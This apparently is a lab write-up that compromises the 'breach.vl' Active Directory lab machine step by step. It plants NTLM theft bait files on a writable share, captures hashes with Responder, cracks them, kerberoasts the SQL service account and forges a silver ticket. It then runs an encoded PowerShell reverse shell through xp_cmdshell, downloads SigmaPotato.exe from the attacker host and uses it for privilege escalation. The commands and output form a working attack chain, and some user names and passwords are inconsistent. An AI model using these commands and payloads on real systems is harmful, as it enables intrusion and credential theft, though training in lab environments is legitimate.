## 2026-07-23
---

Difficulty: Medium

### Information Gathering

IP Address: 10.129.38.47

# User Flag
#### Service Enumeration

Enumeration of the services with NMAP.
```
sudo nmap 10.129.38.47
```

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

With more details.
```
sudo nmap 10.129.38.47 -sC -sV
```

```
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-23 13:54:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.38.47:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-07-23T13:55:28+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-23T13:47:22
|_Not valid after:  2056-07-23T13:47:22
| ms-sql-ntlm-info:
|   10.129.38.47:1433:
|     Target_Name: BREACH
|     NetBIOS_Domain_Name: BREACH
|     NetBIOS_Computer_Name: BREACHDC
|     DNS_Domain_Name: breach.vl
|     DNS_Computer_Name: BREACHDC.breach.vl
|     DNS_Tree_Name: breach.vl
|_    Product_Version: 10.0.20348
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2026-07-22T13:44:34
|_Not valid after:  2027-01-21T13:44:34
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-23T13:54:49+00:00
|_ssl-date: 2026-07-23T13:55:28+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-23T13:54:50
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

#### Initial Access - NTLM Hash Exploitation through writable share

SMB Shares are listed without authentication.
```
smbclient -L //breach.vl
```

```
netexec smb breach.vl -u Julia.Wong -p Computer1 --shares
SMB         10.129.38.47    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.38.47    445    BREACHDC         [+] breach.vl\Julia.Wong:Computer1
SMB         10.129.38.47    445    BREACHDC         [*] Enumerated shares
SMB         10.129.38.47    445    BREACHDC         Share           Permissions     Remark
SMB         10.129.38.47    445    BREACHDC         -----           -----------     ------
SMB         10.129.38.47    445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.38.47    445    BREACHDC         C$                              Default share
SMB         10.129.38.47    445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.38.47    445    BREACHDC         NETLOGON        READ            Logon server share
SMB         10.129.38.47    445    BREACHDC         share           READ,WRITE
SMB         10.129.38.47    445    BREACHDC         SYSVOL          READ            Logon server share
SMB         10.129.38.47    445    BREACHDC         Users           READ
```

Now, inside the read and write accessible share.
```
smbclient //breach.vl/share
```

While all 3 folders found were empty, the `transfer` folder looks promising.

There is a high possibility of exploiting through NLTM Theft through Responder.
```
git clone https://github.com/Greenwolf/ntlm_theft
```

A folder of exploit files is generated with this command.
```
python3 ntlm_theft.py -s 10.10.14.104 -f test -g all
```

```
ls test
 Autorun.inf                   test.library-ms
 desktop.ini                   test.lnk
 test.application              test.m3u
 test.asx                      test.pdf
'test-(externalcell).xlsx'    'test-(remotetemplate).docx'
'test-(frameset).docx'         test.rtf
'test-(fulldocx).xml'          test.scf
'test-(handler).htm'          'test-(stylesheet).xml'
 test.htm                      test.theme
'test-(icon).url'             'test-(url).url'
'test-(includepicture).docx'   test.wax
 test.jnlp                     zoom-attack-instructions.txt
```

Files are put one by one to the writable `share` share.
```
smb: \transfer\> put test.htm
putting file test.htm as \transfer\test.htm (0.1 kB/s) (average 0.1 kB/s)
smb: \transfer\> put desktop.ini
putting file desktop.ini as \transfer\desktop.ini (0.1 kB/s) (average 0.1 kB/s)
smb: \transfer\> put test.lnk
putting file test.lnk as \transfer\test.lnk (3.6 kB/s) (average 1.2 kB/s)
smb: \transfer\> ^C
```

While at the same time, responder is running on the main attacker machine.
```
sudo responder -I tun0 -v
```

The hash has been returned. It can be cracked using hashcat.
```
hashcat -m 5600 hash.txt rockyou.txt
```

As a result, the hash has been successfully cracked.
`Julia.Wong:Computer11` are valid credentials.

The users can be now enumerated with RPC.
```
rpcclient breach.vl -U 'Julia.Wong%Computer1'
```

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Claire.Pope] rid:[0x451]
user:[Julia.Wong] rid:[0x452]
user:[Hilary.Reed] rid:[0x453]
user:[Diana.Pope] rid:[0x454]
user:[Jasmine.Price] rid:[0x455]
user:[George.Williams] rid:[0x456]
user:[Lawrence.Kaur] rid:[0x457]
user:[Jasmine.Slater] rid:[0x458]
user:[Hugh.Watts] rid:[0x459]
user:[Christine.Bruce] rid:[0x45a]
user:[svc_mssql] rid:[0x45b]
```

While bruteforcing the user credentials did not worked, the user `svc_mssql` looks promising.

Searching online, it is possible to see that this user is vulnerable to kerberoasting and silver ticket.

```
impacket-GetUserSPNs -dc-ip 10.129.38.47 'breach.vl/Julia.Wong' -request
```

As expected, the `mssql_svc` user's hash has been returned.

The hash is now cracked again through hashcat.
```
hashcat -m 13100 hash.txt rockyou.txt
```

The credentials are `mssql_svc:Trustno1`

Now, as for the golden ticket attack, the nthash and the domain SID of the user will be required.

For the NTHash.
```
pypykatz crypto nt Trustno1
```

For the Domain SID, it can be found through Bloodhound.
```
bloodhound-ce-python -u mssql_svc -p Trustno1 -d breach.vl --zip -c All -ns 10.129.38.47
```

![[Screenshot 2026-07-24 at 10.16.08.png]]


Then, Silver ticket exploitation is performed.
```
impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip 10.129.38.47 -spn MSSQLSvc/breachdc.breach.vl Administrator
```


Then, it is possible to login through MSSQLClient.
```
KRB5CCNAME=Administrator.ccache impacket-mssqlclient Administrator@breachdc.breach.vl -k -no-pass -windows-auth
```

The login is successful. 
The command shell can be now successfully enabled.
```
enable_xp_cmdshell
```

Then, a new shell will be thrown to the port 4444 using a specific payload from `revshells.com`
```
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADQAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

On the attacker machine.
```
sudo nc -lvnp 4444
```

The user flag has been obtained.
![[Screenshot 2026-07-24 at 09.52.18.png]]

# Root Flag
#### Privilege Escalation - SeImpersonate Privilege Exploitation

The privileges are now checked.
```
whoami /priv
```

This user is vulnerable to the `SeImpersonatePrivilege`.

The binary is transferred from the attacker Linux machine.
```
wget http://10.10.14.104/SigmaPotato.exe -o .\SigmaPotato.exe
```

The privilege is now exploited, throwing the reverse shell to the appropriate port.
```
.\SigmaPotato.exe --revshell 10.10.14.104 4445
```

```
sudo nc -lvnp 4445
```

The root flag has been obtained.

![[Screenshot 2026-07-24 at 09.55.47.png]]